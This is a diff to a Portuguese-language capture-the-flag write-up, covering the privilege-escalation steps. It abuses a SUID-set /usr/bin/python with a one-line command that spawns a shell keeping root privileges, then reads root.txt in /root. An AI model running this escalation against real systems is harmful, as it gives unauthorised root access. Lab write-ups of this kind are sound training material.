@@ -40,14 +40,17 @@
 3. **Escalação de Privilégio**
 
    I. **Exploração de Permissão SUID**
+   
       - /usr/bin/python 
 
       > Solucionado com ajuda de Writeup 
 
    II. **Python**
+   
       - `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
  
    III. **Root**
+   
       - `cd /root/`
       - `ls`
       - root.txt
